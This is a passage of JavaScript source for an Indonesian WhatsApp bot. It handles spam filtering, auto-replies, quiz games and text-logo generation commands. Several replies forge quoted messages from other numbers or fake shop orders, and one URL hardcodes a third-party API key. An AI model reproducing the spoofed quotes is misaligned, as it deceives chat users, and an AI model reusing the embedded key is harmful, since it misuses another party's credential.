if (isCmd && msgFilter.isFiltered(from) && isGroup && !iky.key.fromMe && !isOwner) {
if(cekSpam(sender, spamBan)) return
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
addSpam(sender, "30s", spamBan)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
if(autovn) return sendvn(nospam)
return setReply(textspam)
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

          
   
//******************* 》AUTO SYSTEM《 ********************\\

//AUTO BIO
if(autobio){ 
runoy = process.uptime() 
ikyc.setStatus(`${fake} | Runtime: ${kyun(runoy)} | Baterai: ${baterai.battery} | Total User: ${user.length} | Prefix: 「  ${multi ? 'Multi Prefix' : `${prefix}`}  」`).catch((_)=>_);
}   
//AUTO REGISTER
if (!isUser && isCmd && !isOwner && !iky.key.fromMe){ 
user.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(user))
}
    
//Auto Hit
if(command){
hitnya.push(command)
fs.writeFileSync('./database/hitToday.json', JSON.stringify(hitnya))
}
   
//AUTO TYPING & RECORDING
if (isCmd && autovn){
ikyc.updatePresence(from, Presence.recording)
} else if (isCmd && typing){
ikyc.updatePresence(from, Presence.composing)
} else {
ikyc.updatePresence(from, Presence.avaible)
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command.startsWith(listcmdblock[i].cmd)){
if(autoblockcmd) {
setReply("Maaf kak command tersebut telah di block oleh system karena terjadi error")
return
} else{
setReply(`Maaf kak command tersebut telah di block oleh owner`)
return
}
}
}

//AUTO RESPON
for (let i = 0; i < commandsDB.length ; i++) {
if (budy == commandsDB[i].pesan) {
ikyc.sendMessage(from, commandsDB[i].balasan, text, {quoted: iky})
}
}
    
//AUTO RESPON SIMI BY DECODE DENPA 
if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !iky.key.fromMe) { 
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
ikyc.sendMessage(from, `${sami}`, text, {thumbnail : fakethumbnail, quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb}}}})
} 
    
//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if(isZadani) return
namastc = messagesC
buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
ikyc.sendMessage(from, buffer, sticker, {quoted:iky })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (isSpammerr) return sendSticker(spam2)
buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
ikyc.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}, ptt: true, contextInfo: forward})
addSpammer(sender, "10s", spamkuyy)
}
}
	
//AUTO RESPON MUSIK
for (let anjir of musiknye){
if (budy === anjir || responseButton === anjir ){
setReply("*Loading...*")
buffer = fs.readFileSync(`./temp/musik/${anjir}.mp3`)
ikyc.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${anjir}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
}
}
	
//AUTO RESPON IMAGE
if (imagenye.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
ikyc.sendMessage(from, buffer, image, {quoted : iky})
}

//AUTO RESPON VIDEO
if (videonye.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
ikyc.sendMessage(from, buffer, video, {quoted : iky})
}

//RESPON
if(budy.includes('hey')){
cpref = `Hay Saya Iky-Bot Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Hey')){
cpref = `Hay Saya Iky-Bot Ketik .menu Untuk Mengakses`
reply(cpref)
}	 	      	   	   	   
//AKSES PRIVATE 
if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) {
if(autovn) return sendvn(gakmau)
return setReply(teksChat)
}

//========================================================================================================================//
colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')


					
if (!isGroup && !isCmd ) console.log(color("[PRIBADI] <IKY-BOT>", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GC] <IKY-BOT>", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[COMMAND] <IKY-BOT>", "yellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[COMMAND] <IKY-BOT>", "yellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!iky.key.fromMe && isCmd ) console.log(color("[OWNER] <IKY-BOT>", "cyan"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'yellow'), color(groupName, "deeppink"))
_sewa.expiredCheck(ikyc, sewa)
_prem.expiredCheck(premium)


 game.cekWaktuTK(ikyc, tebakkata)
 game.cekWaktuFam(ikyc, family100)
 game.cekWaktuTG(ikyc, tebakgambar)
 game.cekWaktuMtk(ikyc, mtk) 
 game.cekWaktuTB(ikyc, tebakbendera)
 game.cekWaktuTA(ikyc, tebakanime)
 game.cekWaktuSA(ikyc, siapaaku)
 game.cekWaktuTL(ikyc, tebaklirik)
 game.cekWaktuCkl(ikyc, caklontong)


if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htti = randomNomor(100)
                    addBalance(sender, htpk, balance)
                    await reply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htti} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                }
            }
if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpk = randomNomor(100)
                    addBalance(sender, htpk, balance)
                    await reply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }        
            if (tebakimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var httk = randomNomor(100)
                    addBalance(sender, httk, balance)
                    await reply(`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${httk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                }
            }             
if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   ikyc.sendMessage(from, starGame, text, {quoted: ftoko, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./media/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		ikyc.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: ftoko, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
	}
}	
if (game.isCkl(from, caklontong)){
if(budy.includes("yerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanCkl(from, caklontong)}`)
caklontong.splice(game.getCklPosi(from, caklontong), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
var htgtk = randomNomor(100)
addBalance(sender, htgtk, balance)
await setReply(`*GAME CAK LONTONG*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanCkl(from, caklontong)}\n*Hadiah : $${htgtk}
Ingin bermain lagi? kirim ${prefix}caklontong`)
caklontong.splice(game.getCklPosi(from, caklontong), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}
 
if (game.isTebakKata(from, tebakkata)){
if(budy.includes("yerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTK(from, tebakkata)}`)
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(100)
addBalance(sender, htgtk, balance)
await setReply(`*GAME TEBAK KATA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTK(from, tebakkata)}\n*Hadiah : $${htgtk}
Ingin bermain lagi? kirim ${prefix}tebakkata`)
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}
 
if (game.isTebakGambar(from, tebakgambar)){
if(budy.includes("yerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTG(from, tebakgambar)}`)
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(100)
addBalance(sender, htgm, balance)
await setReply(`*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : $${htgm}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar`)
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
} else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}
if (game.isMtk(from, mtk)){
if(budy.includes("yerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanMtk(from, mtk)}`)
mtk.splice(game.getMtkPosi(from, mtk), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
var htgm3 = randomNomor(1000)
addBalance(sender, htgm3, balance)
await setReply(`*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\n*Hadiah : $${htgm3}\n\nIngin bermain lagi? kirim ${prefix}math`)
mtk.splice(game.getMtkPosi(from, mtk), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}    
if (game.isfam(from, family100)){
var anjuy = game.getjawaban100(from, family100)
for (let i of anjuy){
if (chatss.toLowerCase().includes(i)){
var htgm1 = randomNomor(1000)
addBalance(sender, htgm1 , balance)
await setReply(`Jawaban benar\nJawaban : ${i}\nHadiah : $${htgm1}\n\nJawaban yang blum tertebak : ${anjuy.length - 1}`)
var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
} 
}
if (anjuy.length < 1){
ikyc.sendMessage(from, `Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`, text)
family100.splice(game.getfamposi(from, family100), 1)
}
}   
if (game.isTebakBendera(from, tebakbendera)){
if(budy.includes("Nyerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTB(from, tebakbendera)}`)
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(100)
addBalance(sender, syahira, balance)
await setReply(`*GAME TEBAK BENDERA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : $${syahira}
Ingin bermain lagi? kirim ${prefix}tebakbendera`)
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
} else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}
if (game.isTebakAnime(from, tebakanime)){
if(budy.includes("yerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTA(from, tebakanime)}`)
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(100)
addBalance(sender, vinna, balance)
await setReply(`*GAME TEBAK ANIME*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : $${vinna}
Ingin bermain lagi? kirim ${prefix}tebakanime`)
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
} 	        

if (game.isTebakLirik(from, tebaklirik)){
if(budy.includes("nyerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTL(from, tebaklirik)}`)
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTL(from, tebaklirik))){
var htgml = randomNomor(100)
addBalance(sender, htgml, balance)
await setReply(`*GAME TEBAK LIRIK*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : $${htgml}
Ingin bermain lagi? kirim ${prefix}tebaklirik`)
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
} 
if (game.isSiapaAku(from, siapaaku)){
if(budy.includes("nyerah")){
setReply(`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanSA(from, siapaaku)}`)
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(100)
addBalance(sender, htgmu, balance)
await setReply(`*GAME SIAPAKAH AKU*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : $${htgmu}
Ingin bermain lagi? kirim ${prefix}siapakahaku`)
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}else if(type === 'conversation' && !command && !iky.key.fromMe){
setReply(jawabansalah)
}
}

const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]

//if (atibot === true) return 
                     
   
try{ 
switch (command) {
	
	case 'blackping':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
	
	case 'glitch':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'buro':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	photooxy("https://photooxy.com/logo-and-text-effects/butterfly-text-with-reflection-effect-183.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
	
	case 'glitch2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'layered':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-layered-text-effects-online-free-1032.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'porn':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'marvel':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-logo-style-marvel-studios-online-971.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'ppcp':
case 'ppcouple':
if (isBanned) return reply(mess.banned)
woy = await fetchJson(`https://api.lolhuman.xyz/api/random/ppcouple?apikey=himaru`)
buff1 = await getBuffer (woy.result.male)
ikyc.sendMessage(from, buff1, image, {quoted: iky, caption: 'COWOK'})
buff2 =await getBuffer (woy.result.female)
ikyc.sendMessage(from, buff2, image, {quoted: iky, caption: 'CEWEK'})
break
case '3dmetalsilver':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/text-logo-3d-metal-silver-946.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case '3dmetalrosegold':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/text-logo-3d-metal-rose-gold-945.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case '3dmetalgold':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/text-logo-3d-metal-gold-944.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case '3dmetalgalaxy':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/text-logo-3d-metal-galaxy-943.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'lionlogo':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'stone2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-a-stone-text-effect-online-982.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'steels':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/3d-steel-text-effect-877.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'vintage':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'grav3':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'restart':
      if (isBanned) return reply(mess.banned)
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main.js`)
             reply('_Restarting Bot Success_')
             break
case 'wolf2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'wolf1':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-wolf-logo-black-white-937.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'ninjas':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-ninja-logo-online-935.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break
case 'grav2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
case '8bit':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: iky, caption: "𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔𝘽𝙊𝙏"}))
  .catch((err) => console.log(err));
   break	
		
	
	
	case 'glitch3':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
